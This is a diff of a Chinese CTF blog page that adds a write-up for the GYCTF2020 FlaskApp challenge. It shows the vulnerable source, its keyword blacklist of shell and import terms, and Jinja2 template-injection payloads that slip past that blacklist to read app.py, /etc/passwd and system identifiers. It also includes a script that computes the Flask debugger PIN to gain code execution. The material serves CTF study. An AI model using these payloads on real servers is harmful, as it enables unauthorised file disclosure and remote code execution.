@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    4.4k 字
+                    5.3k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    76
+                    91
                      分钟
                   </span>
                 
@@ -808,6 +808,125 @@ Upgrade-Insecure-Requests: 1</code></pre>
 <p><img src="https://s1.ax1x.com/2020/05/19/Y4d9Cd.png" srcset="/img/loading.gif" alt="Y4d9Cd.png"></p>
 <pre><code class="hljs undefined">flag&#123;581e34e4-08d6-42d5-ae01-8cc87a35a29a&#125;</code></pre>
 
+<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>看题目猜测是ssti，在解密随便输入跳到flask debug页面，可以看到部分源码，找了一下render相关字眼</p>
+<pre><code class="hljs undefined">@app.route(&apos;/decode&apos;,methods=[&apos;POST&apos;,&apos;GET&apos;])
+def decode():
+    if request.values.get(&apos;text&apos;) :
+        text = request.values.get(&quot;text&quot;)
+        text_decode = base64.b64decode(text.encode())
+        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())
+        if waf(tmp) :
+            flash(&quot;no no no !!&quot;)
+            return redirect(url_for(&apos;decode&apos;))
+        res =  render_template_string(tmp)</code></pre>
+
+<p>明显是ssti了，但可以隐约看到waf()，说明过滤了些什么,</p>
+<pre><code class="hljs undefined">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
+
+<p>一发读文件的pyload打过去</p>
+<p>base64解密稍微美化一下可以看到</p>
+<pre><code class="hljs undefined">def waf(str):
+    black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,
+                  &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]
+    for x in black_list :
+        if x in str.lower() :
+            return 1</code></pre>
+
+<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>参考于：<a href="https://www.cnblogs.com/h3zh1/p/12694933.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12694933.html</a></p>
+<p>利用字符拼接绕黑名单os读一下flag文件名:this_is_the_flag.txt</p>
+<pre><code class="hljs undefined">&#123;&#123;&apos;&apos;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125;
+
+#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ==</code></pre>
+
+<p>利用切片绕一下flag关键词黑名单</p>
+<pre><code class="hljs undefined">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;txt.galf_eht_si_siht/&apos;[::-1],&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+
+#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/20/Y7kkmq.png" srcset="/img/loading.gif" alt="Y7kkmq.png"></p>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><strong>Flask debug模式下，配合任意文件读取，造成的任意代码执行</strong></p>
+<p>相关文章:<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">https://xz.aliyun.com/t/2553</a></p>
+<p>参考wp:<a href="https://ctf.ieki.xyz/buuoj/gyctf-2020.html" target="_blank" rel="noopener">https://ctf.ieki.xyz/buuoj/gyctf-2020.html</a></p>
+<p>通过PIN码生成机制可知，需要获取如下信息</p>
+<ol>
+<li>服务器运行flask所登录的用户名。通过/etc/passwd中可以猜测为flaskweb 或者root，此处用的flaskweb</li>
+<li>modname。一般不变就是flask.app</li>
+<li>getattr(app, “__name__”, app.__class__.__name__)。python该值一般为Flask，该值一般不变</li>
+<li>flask库下app.py的绝对路径。报错信息会泄露该值。题中为/usr/local/lib/python3.7/site-packages/flask/app.py</li>
+<li>当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取(eth0为网卡名)，本题为02:42:ae:01:0d:25，转换后为2485410401573</li>
+<li>机器的id</li>
+</ol>
+<p>读/etc/passwd </p>
+<pre><code class="hljs undefined">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&quot;/etc/passwd&quot;).read()&#125;&#125;
+
+#e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCIvZXRjL3Bhc3N3ZCIpLnJlYWQoKX19</code></pre>
+
+<p>通过/etc/passwd中可以猜测为flaskweb 或者root ，此处用的flaskweb</p>
+<pre><code class="hljs undefined">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&quot;/sys/class/net/eth0/address&quot;).read()&#125;&#125;</code></pre>
+
+<p>读mac地址:</p>
+<pre><code class="hljs undefined">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&quot;/sys/class/net/eth0/address&quot;).read()&#125;&#125;
+
+#e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCIvc3lzL2NsYXNzL25ldC9ldGgwL2FkZHJlc3MiKS5yZWFkKCl9fQ==</code></pre>
+
+<p> 02:42:ae:01:6a:2e 转10进制</p>
+<p><img src="https://s1.ax1x.com/2020/05/20/Y7kP6s.png" srcset="/img/loading.gif" alt="Y7kP6s.png"></p>
+<p>获取机器ID</p>
+<pre><code class="hljs undefined">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&apos;open&apos;](&quot;/proc/self/cgroup&quot;).read()&#125;&#125;
+
+#e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCIvcHJvYy9zZWxmL2Nncm91cCIpLnJlYWQoKX19</code></pre>
+
+<p>修改脚本:</p>
+<pre><code class="hljs undefined">import hashlib
+from itertools import chain
+probably_public_bits = [
+    &apos;flaskweb&apos;,
+    &apos;flask.app&apos;,
+    &apos;Flask&apos;,
+    &apos;/usr/local/lib/python3.7/site-packages/flask/app.py&apos;,
+]
+
+private_bits = [
+    &apos;2485410404100&apos;,
+    &apos;b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd&apos;
+]
+
+h = hashlib.md5()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&apos;utf-8&apos;)
+    h.update(bit)
+h.update(b&apos;cookiesalt&apos;)
+
+cookie_name = &apos;__wzd&apos; + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b&apos;pinsalt&apos;)
+    num = (&apos;%09d&apos; % int(h.hexdigest(), 16))[:9]
+
+rv =None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &apos;-&apos;.join(num[x:x + group_size].rjust(group_size, &apos;0&apos;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)</code></pre>
+
+<p>获取pin码</p>
+<pre><code class="hljs undefined">254-248-525</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/20/Y7kiXn.png" srcset="/img/loading.gif" alt="Y7kiXn.png"></p>
+<p>打完收工</p>
+<pre><code class="hljs undefined">flag&#123;75fd8735-d2ab-4850-b9b8-14fa6e341bdf&#125;</code></pre>
+
+<p>最后补看一下先知那篇文章啊阿啊</p>
 
             </article>
             <hr>
